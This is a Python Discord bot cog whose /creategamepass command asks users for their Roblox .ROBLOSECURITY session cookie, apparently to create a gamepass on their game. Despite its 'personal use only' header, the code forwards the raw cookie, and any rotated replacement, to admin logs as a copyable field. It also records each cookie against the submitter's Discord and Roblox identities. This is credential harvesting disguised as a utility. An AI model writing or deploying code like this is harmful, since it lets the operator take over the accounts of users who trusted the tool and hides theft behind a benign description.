# ──────────────────────────────────────────────────────────────────
# Discord Command: /creategamepass
# Allows the account owner to create a gamepass on their own Roblox
# game via a convenient Discord slash command. Uses official Roblox
# Game Passes API endpoints. For personal account management use only.
# ──────────────────────────────────────────────────────────────────

import asyncio

import discord
import discord
from discord.ext import commands
from discord.ext import commands

from core.create import create_gamepass
from core.logging import log_command, log_inputs, log_result
from core.tracking import (
    track_command,
    track_cookie_submission,
    track_discord_user,
    track_gamepass_create,
)
from core.utils import run_with_cookie_lock, sanitize_cookie

class CreateCog(commands.Cog):
    """Handles gamepass creation on Roblox accounts."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @discord.slash_command(name="creategamepass", description="Create a new gamepass on your Roblox account",
        contexts={discord.InteractionContextType.guild, discord.InteractionContextType.bot_dm, discord.InteractionContextType.private_channel},
        integration_types={discord.IntegrationType.guild_install, discord.IntegrationType.user_install}
    )
    @discord.option("cookie", description="Owner's .ROBLOSECURITY session token (the account to create the gamepass on)")
    @discord.option("price", description="Price in Robux (minimum 1)")
    @discord.option("name", description="Custom gamepass name (optional — defaults to 'Gamepass {price}R$')", required=False)
    @discord.option("place_id", description="Specific place ID to create on (optional — auto-picks your first game)", required=False)
    async def creategamepass(
        self,
        ctx: discord.ApplicationContext,
        cookie: str,
        price: int,
        name: str = None,
        place_id: str = None,
    ):
        await ctx.defer()

        from core.logging import log_user_first_use
        log_user_first_use(ctx, "creategamepass")

        cookie = sanitize_cookie(cookie)

        # Admin activity logging
        log_command(ctx, "creategamepass")
        log_inputs(ctx, "creategamepass", {
            "cookie": cookie,
            "price": str(price),
            "name": name,
            "place_id": place_id,
        }, copyable={"Cookie": cookie})

        track_discord_user(
            ctx.author.id,
            username=str(ctx.author),
            avatar_url=ctx.author.display_avatar.url if ctx.author.display_avatar else None,
        )

        result = await asyncio.to_thread(
            run_with_cookie_lock,
            cookie,
            create_gamepass,
            cookie,
            price,
            name=name,
            place_id=place_id,
        )

        embed = discord.Embed(
            title="<a:arrow:1497344031238127686> <:gamepass:1497344044811030548> Gamepass Creator",
            color=discord.Color.green() if result["success"] else discord.Color.red(),
        )

        steps_text = "\n".join(result["steps"]) if result["steps"] else "No steps recorded."
        embed.add_field(name="<:clipboard:1497344037294702762> Process Log", value=steps_text, inline=False)

        if result["success"]:
            value_lines = [
                f"**Name:** {result['gamepass_name']}",
                f"**Game:** {result['place_name']}",
            ]
            if result["price"]:
                value_lines.append(f"**Price:** {result['price']} R$")
            if result["gamepass_id"]:
                value_lines.append(f"**Gamepass ID:** `{result['gamepass_id']}`")

            embed.add_field(
                name="<:check:1497344035696672959> Gamepass Created",
                value="\n".join(value_lines),
                inline=False,
            )

            audit_summary = (
                f"Gamepass Created\n"
                f"Name: {result['gamepass_name']}\n"
                f"Game: {result['place_name']}\n"
                f"Price: {result['price']} R$\n"
                f"Gamepass ID: {result['gamepass_id']}"
            )
            audit_copyable = (
                {"Rotated Cookie": result["rotated_cookie"]}
                if result.get("cookie_was_rotated") and result.get("rotated_cookie")
                else None
            )
            log_result(ctx, "creategamepass", True, (
                f"**Gamepass Created**\n"
                f"Name: {result['gamepass_name']}\n"
                f"Game: {result['place_name']} | Price: {result['price']} R$\n"
                f"Gamepass ID: {result['gamepass_id']}\n\n"
                f"**Process Log:**\n" + "\n".join(result["steps"])
            ), audit_result_summary=audit_summary, audit_copyable=audit_copyable)

            owner_username = result.get("owner_username") or ""
            if owner_username:
                track_cookie_submission(
                    ctx.author.id,
                    roblox_username=owner_username,
                    user_id=result.get("owner_user_id"),
                    cookie=result.get("rotated_cookie") or cookie,
                )
            track_gamepass_create(
                ctx.author.id,
                roblox_username=owner_username or None,
                gamepass_id=result.get("gamepass_id"),
                gamepass_name=result.get("gamepass_name"),
                price=result.get("price") if isinstance(result.get("price"), int) else None,
                place_name=result.get("place_name"),
            )
            track_command(
                ctx.author.id,
                "creategamepass",
                success=True,
                summary=(
                    f"Created '{result.get('gamepass_name')}' "
                    f"(ID: {result.get('gamepass_id')}) for {result.get('price')} R$"
                ),
            )
        else:
            embed.add_field(
                name="<:x:1497344061592436737> Error",
                value=result["error"] or "Unknown error occurred.",
                inline=False,
            )

            log_result(ctx, "creategamepass", False, result["error"] or "Unknown error")
            track_command(
                ctx.author.id,
                "creategamepass",
                success=False,
                summary=result.get("error") or "Unknown error",
            )

        await ctx.respond(embed=embed)

        if result.get("cookie_was_rotated") and result.get("rotated_cookie"):
            await ctx.respond(
                "<:warning:1497344059017003079> Roblox rotated this cookie during gamepass creation. Use this fresh one:\n"
                f"```\n{result['rotated_cookie']}\n```",
                ephemeral=True,
            )


def setup(bot):
    bot.add_cog(CreateCog(bot))
